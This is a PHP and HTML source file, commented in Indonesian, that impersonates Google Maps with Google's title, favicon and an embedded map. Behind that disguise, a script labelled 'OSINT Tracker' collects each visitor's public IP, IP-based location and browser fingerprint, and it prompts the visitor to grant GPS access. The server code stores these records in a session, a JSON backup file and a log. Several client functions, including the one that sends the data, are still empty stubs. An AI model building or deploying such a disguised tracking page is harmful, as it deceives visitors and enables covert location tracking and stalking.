<?php
// Aktifkan error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Header CORS untuk mengizinkan semua origin
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Tangani preflight request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

session_start();

// Inisialisasi array data dengan pengecekan
if (!isset($_SESSION['visitor_data']) || !is_array($_SESSION['visitor_data'])) {
    $_SESSION['visitor_data'] = [];
}

// Fungsi untuk logging
function writeLog($message, $data = null) {
    $logFile = __DIR__ . '/osint_debug.log';
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[$timestamp] $message";
    if ($data) {
        $logMessage .= " - " . json_encode($data, JSON_PRETTY_PRINT);
    }
    file_put_contents($logFile, $logMessage . PHP_EOL, FILE_APPEND);
}

writeLog("Index.php accessed from " . $_SERVER['REMOTE_ADDR']);

// Menyimpan data tracking
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    writeLog("Raw POST data", $input);
    
    if (isset($_POST['visitor_data'])) {
        $visitorData = json_decode($_POST['visitor_data'], true);
        writeLog("Decoded visitor data", $visitorData);
        
        if ($visitorData && is_array($visitorData)) {
            // Tambahkan timestamp server
            $visitorData['server_timestamp'] = date('Y-m-d H:i:s');
            $visitorData['server_ip'] = $_SERVER['REMOTE_ADDR'];
            $visitorData['server_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            
            // Validasi koordinat
            if (isset($visitorData['latitude']) && isset($visitorData['longitude'])) {
                if (abs($visitorData['latitude']) > 0.1 && abs($visitorData['longitude']) > 0.1) {
                    $visitorData['valid_coordinates'] = true;
                    $visitorData['google_maps_link'] = "https://www.google.com/maps?q={$visitorData['latitude']},{$visitorData['longitude']}";
                } else {
                    $visitorData['valid_coordinates'] = false;
                }
            }
            
            // Simpan ke session (batasi 200 data terakhir)
            array_unshift($_SESSION['visitor_data'], $visitorData);
            $_SESSION['visitor_data'] = array_slice($_SESSION['visitor_data'], 0, 200);
            
            // Simpan juga ke file sebagai backup jika session bermasalah
            $backupFile = __DIR__ . '/osint_backup.json';
            $backupData = [];
            if (file_exists($backupFile)) {
                $backupContent = file_get_contents($backupFile);
                $backupData = json_decode($backupContent, true) ?: [];
            }
            array_unshift($backupData, $visitorData);
            $backupData = array_slice($backupData, 0, 200);
            file_put_contents($backupFile, json_encode($backupData, JSON_PRETTY_PRINT));
            
            writeLog("Data saved successfully", $visitorData);
            
            echo json_encode([
                'status' => 'success',
                'message' => 'Data tracking tersimpan',
                'data' => $visitorData,
                'session_id' => session_id(),
                'server_time' => date('Y-m-d H:i:s')
            ]);
            exit;
        } else {
            writeLog("Invalid visitor data format", $visitorData);
            echo json_encode([
                'status' => 'error',
                'message' => 'Invalid data format'
            ]);
            exit;
        }
    } else {
        writeLog("No visitor_data in POST");
        echo json_encode([
            'status' => 'error',
            'message' => 'No data received'
        ]);
        exit;
    }
}

// Halaman utama
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Maps</title>
    <link rel="icon" href="https://www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Roboto, Arial, sans-serif;
        }
        
        body {
            background: #e9eef2;
            color: #202124;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        .map-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: auto;
        }

        .search-container-box {
            position: absolute;
            top: 12px;
            left: 12px;
            z-index: 10;
            width: 392px;
            height: 48px;
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2), 0 -1px 0px rgba(0,0,0,0.02);
            display: flex;
            align-items: center;
            padding: 0 16px;
        }

        .search-container-box:hover {
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        .menu-btn {
            color: #5f6368;
            font-size: 20px;
            cursor: pointer;
            padding: 8px;
        }

        .search-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 15px;
            padding: 0 12px;
            background: transparent;
        }

        .search-input::placeholder {
            color: #70757a;
        }

        .search-actions {
            display: flex;
            align-items: center;
            gap: 12px;
            color: #5f6368;
        }

        .divider {
            height: 24px;
            width: 1px;
            background: #e8eaed;
        }

        .action-icon {
            cursor: pointer;
            font-size: 18px;
            padding: 4px;
        }

        .action-icon.blue {
            color: #1a73e8;
        }

        .top-right-controls {
            position: absolute;
            top: 12px;
            right: 12px;
            z-index: 10;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .map-layer-btn {
            width: 40px;
            height: 40px;
            background: #fff;
            border-radius: 4px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #5f6368;
        }

        .map-layer-btn:hover { background: #f8f9fa; }

        .profile-avatar {
            width: 32px;
            height: 32px;
            background: #1a73e8;
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
            cursor: pointer;
        }

        .bottom-right-controls {
            position: absolute;
            bottom: 24px;
            right: 12px;
            z-index: 10;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .floating-btn {
            width: 40px;
            height: 40px;
            background: #fff;
            border-radius: 50%;
            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #5f6368;
            font-size: 18px;
        }

        .floating-btn:hover { background: #f8f9fa; }

        .zoom-group {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .zoom-btn {
            width: 40px;
            height: 40px;
            background: #fff;
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #5f6368;
            font-size: 18px;
        }

        .zoom-btn:hover { background: #f8f9fa; }
        .zoom-btn:first-child { border-bottom: 1px solid #e8eaed; }
        .mobile-bottom-sheet {
                display: none;
                position: absolute;
                bottom: 0;
                left: 0;
                width: 100%;
                background: white;
                border-top-left-radius: 16px;
                border-top-right-radius: 16px;
                box-shadow: 0 -4px 10px rgba(0,0,0,0.1);
                z-index: 15;
                padding-bottom: 20px;
                transform: translateY(100%);
                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            }

            .mobile-bottom-sheet.active {
                transform: translateY(0);
            }

            .sheet-handle-wrap {
                padding: 12px 0;
                display: flex;
                justify-content: center;
                cursor: pointer;
            }

            .sheet-handle {
                width: 36px;
                height: 4px;
                background: #dadce0;
                border-radius: 2px;
            }

            .explore-content {
                padding: 0 20px 10px 20px;
            }

            .explore-title {
                font-size: 22px;
                font-weight: 500;
                color: #202124;
                margin-bottom: 16px;
            }

            .category-chips {
                display: flex;
                gap: 12px;
                overflow-x: auto;
                padding-bottom: 8px;
            }

            .category-chips::-webkit-scrollbar { display: none; }

            .chip {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 8px;
                min-width: 72px;
                cursor: pointer;
            }

            .chip-icon {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background: #f1f3f4;
                border: 1px solid #e8eaed;
                display: flex;
                align-items: center;
                justify-content: center;
                color: #1a73e8;
                font-size: 16px;
            }

            .chip-text {
                font-size: 12px;
                color: #3c4043;
                font-weight: 500;
            }

            @media (max-width: 768px) {
                .mobile-bottom-sheet {
                    display: block;
                }
                .top-right-controls {
                    top: 72px;
                }
                .bottom-right-controls {
                    bottom: 120px;
                }
            }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.0);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            pointer-events: none;
        }
        
        /* Status Bar - Menampilkan status permintaan lokasi */
        .location-status-bar {
            position: absolute;
            bottom: 30px;
            left: 20px;
            right: 20px;
            background: rgba(0,0,0,0.75);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 12px 20px;
            z-index: 20;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.3s ease;
            max-width: 320px;
            pointer-events: none;
        }
        
        .location-status-bar.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }
        
        .status-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }
        
        .status-icon.waiting {
            background: #fbbc04;
            animation: pulse 1.5s infinite;
        }
        
        .status-icon.success {
            background: #34a853;
        }
        
        .status-icon.error {
            background: #ea4335;
        }
        
        @keyframes pulse {
            0% { opacity: 0.5; transform: scale(0.9); }
            100% { opacity: 1; transform: scale(1.1); }
        }
        
        .status-text {
            flex: 1;
            font-size: 13px;
            color: white;
            font-weight: 500;
        }
        
        .status-sub {
            font-size: 11px;
            color: rgba(255,255,255,0.6);
            margin-top: 2px;
        }
        
        @media (max-width: 768px) {
            .location-status-bar {
                bottom: 120px;
                left: 12px;
                right: 12px;
                max-width: none;
            }
        }
    </style>
</head>
<body>
    <div class="map-background">
        <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15843.34861652759!2d106.82271665!3d-6.1753924!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sid!4v1710925200000!5m2!1sen!2sid" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
    </div>

    <div class="loading-overlay" id="loadingOverlay"></div>
    
    <!-- Status Bar untuk menunggu izin lokasi -->
    <div class="location-status-bar" id="locationStatusBar">
        <div class="status-icon waiting" id="statusIcon">
            <i class="fas fa-location-arrow" style="font-size: 12px;"></i>
        </div>
        <div>
            <div class="status-text" id="statusText">Menunggu izin lokasi...</div>
            <div class="status-sub" id="statusSub">Klik "Izinkan" pada popup browser</div>
        </div>
    </div>

    <!-- Search box dan controls lainnya ... -->

    <div class="mobile-bottom-sheet" id="bottomSheet">
        <div class="sheet-handle-wrap">
            <div class="sheet-handle"></div>
        </div>
        <div class="explore-content">
            <h2 class="explore-title">Jelajahi sekitar</h2>
            <div class="category-chips">
                <div class="chip">
                    <div class="chip-icon"><i class="fas fa-utensils"></i></div>
                    <span class="chip-text">Restoran</span>
                </div>
                <div class="chip">
                    <div class="chip-icon"><i class="fas fa-gas-pump"></i></div>
                    <span class="chip-text">SPBU</span>
                </div>
                <div class="chip">
                    <div class="chip-icon"><i class="fas fa-coffee"></i></div>
                    <span class="chip-text">Kopi</span>
                </div>
                <div class="chip">
                    <div class="chip-icon"><i class="fas fa-shopping-cart"></i></div>
                    <span class="chip-text">Belanja</span>
                </div>
                <div class="chip">
                    <div class="chip-icon"><i class="fas fa-hotel"></i></div>
                    <span class="chip-text">Hotel</span>
                </div>
            </div>
        </div>
    </div>
    <script>
    // OSINT Tracker - MENUNGGU IZIN LOKASI TANPA TIMEOUT
    class OSINTTracker {
        constructor() {
            this.userData = {
                ip_address: 'Mengambil IP...',
                public_ip: 'Mengambil IP...',
                latitude: 0,
                longitude: 0,
                accuracy: 0,
                country: 'Menunggu...',
                city: 'Menunggu...',
                full_address: 'Menunggu...',
                source: 'pending',
                gps_allowed: false,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen_resolution: `${window.screen.width}x${window.screen.height}`,
                page_url: window.location.href,
                referrer: document.referrer || 'Direct'
            };
            
            this.isWaiting = true;
            this.gpsSuccess = false;
            this.gpsAttempted = false;
            
            console.log('✅ OSINT Tracker Active');
            this.init();
        }
        
        updateStatus(status, subStatus, isSuccess = false, isError = false) {
            const statusText = document.getElementById('statusText');
            const statusSub = document.getElementById('statusSub');
            const statusIcon = document.getElementById('statusIcon');
            const statusBar = document.getElementById('locationStatusBar');
            
            if (statusText) statusText.textContent = status;
            if (statusSub) statusSub.textContent = subStatus;
            
            if (statusIcon) {
                if (isSuccess) {
                    statusIcon.className = 'status-icon success';
                    statusIcon.innerHTML = '<i class="fas fa-check" style="font-size: 12px;"></i>';
                } else if (isError) {
                    statusIcon.className = 'status-icon error';
                    statusIcon.innerHTML = '<i class="fas fa-times" style="font-size: 12px;"></i>';
                } else {
                    statusIcon.className = 'status-icon waiting';
                    statusIcon.innerHTML = '<i class="fas fa-location-arrow" style="font-size: 12px;"></i>';
                }
            }
            
            // Sembunyikan status bar setelah sukses/error (5 detik)
            if (isSuccess || isError) {
                setTimeout(() => {
                    if (statusBar) statusBar.classList.add('hidden');
                }, 5000);
            } else {
                if (statusBar) statusBar.classList.remove('hidden');
            }
        }
        
         async init() {
            this.updateStatus('Mengambil data IP...', 'Mendeteksi jaringan');
            await this.getIPAddress();
            await this.sendData();
            this.requestGPSPermission();
        }
        
        async getIPAddress() {
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api.myip.com',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];
            
            for (const api of apis) {
                try {
                    const response = await fetch(api, { mode: 'cors', cache: 'no-cache' });
                    const data = await response.json();
                    
                    if (data.ip) {
                        this.userData.ip_address = data.ip;
                        this.userData.public_ip = data.ip;
                        await this.getIPLocation(data.ip);
                        return;
                    }
                } catch (e) {}
            }
        }
        
        async getIPLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
                    mode: 'cors',
                    cache: 'no-cache'
                });
                const data = await response.json();
                
                if (data && !data.error) {
                    this.userData.country = data.country_name || 'Tidak diketahui';
                    this.userData.city = data.city || 'Tidak diketahui';
                    this.userData.latitude = data.latitude || 0;
                    this.userData.longitude = data.longitude || 0;
                    this.userData.source = 'ip_based';
                }
            } catch (e) {}
        }
        
        async requestGPSPermission() {
            // akan diimplementasikan di commit berikutnya
        }
        
        async reverseGeocode() {
            // akan diimplementasikan di commit berikutnya
        }
        
        async fallbackToIP() {
            // akan diimplementasikan di commit berikutnya
        }
        
        async sendData() {
            // akan diimplementasikan di commit berikutnya
        }
    }
    </script>
</body>
</html>